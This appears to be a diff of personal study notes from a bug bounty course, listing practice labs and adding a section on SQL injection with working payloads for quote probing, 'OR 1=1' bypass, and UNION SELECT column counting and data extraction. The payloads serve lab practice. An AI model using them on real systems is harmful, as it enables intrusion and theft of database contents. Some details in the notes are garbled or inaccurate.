@@ -1,9 +1,10 @@
 Bug Bounty Hunting Course Jot Downs:
 
 - OTW Natas
-- Hacker101 CTF from HackerOne
+- Hacker101 CTF from HackerOne (Hacker 101)
 - Hack The Box
 - TryHackMe
+- Port Swigger Labs
 
 VW Ware: https://www.vmware.com/products/workstation-player/workstation-player-evaluation.html
 Kali Linux PreBuilt VM: https://www.kali.org/get-kali/#kali-virtual-machines
@@ -273,15 +274,54 @@ Business logic tip:
 objects are formed
 -- Some objects may hove "role", "quantity", or "price" attributes
  that can be changed/added etc..
+-- Make sure to walk through the proccessing steps with the Forward button
+until it's blank to check for opportunities
+-- Treat like debugger stepper
 
 
+######## SQL Injections ########
+
+- Start with input forms and use quotes to catch data entry errors
+-- single quote = '
+-- double quote = "
+--- no space after "=" sign
+-- ex: SELECT * FROM users WHERE username = "{my input}";
+------ SELECT * FROM users WHERE username = "(")" // adding quote will close query
+-- SELECT * FROM Users.users.... : Users = db users = table
+- 501: internal service network errors
+-- A 'true' statment must be made between the query quotes to not crash
+------ input: asdf OR 1 = 1;# (# comments out org closing quote based on db type)
+- Checking the number of columns a table may have
+- SELECT * FROM users WHERE username =' UNION SELECT + NULL, NULL..;#
+--- GET/api/path=here'UNION+SELECT+NULL,NULL..-- (-- comments out remaining query)
+------- If HTTP 200 response: Num of NULL = Num of Columns
+-- input: asdf' UNION SELECT NULL,NULL,NULL;#
+---- Union select will add onto the query
+---- If this is successful that means there are 3 columns
+---- if not then server may crash and there are less than 3 columns
+- Checking which colums except string data
+-- GET/api/path=here'UNION+SELECT+NULL,'test',NULL--
+---- Enter single quote string data in place of each NULL in GET request
+---- If HTTP 200 response code: respective column accepts string data
+- Pulling Down Information from DB table
+--- TIP: if I am querying on 2 columns but table has 3 I must include the NULL columns
+--- FROM: GET/api/path=here'UNION+SELECT+col1,col2,NULL--
+--- TO: GET/api/path=here'UNION+SELECT+NULL+col1,+col2--
+------- this is after knowing the column names
+------- if UNION with another table:
+----------- GET/api/path=here'UNION+SELECT+NULL+col1,+col2+FROM+table--
+-- Comb through the html to find table elements
+-- Union command will add results right on top of existing table data
 
 
 
 $ Juice Shop
-- TODO: Get Juice Shop to pay me hundreds of dollars
-- Buy something really expensive for next to nothing
+- TODO: 
 
+$ Port Swigger
+- TODO: 
+-- Lab: SQL injection UNION attack, retrieving multiple 
+values in a single column
 
 
 
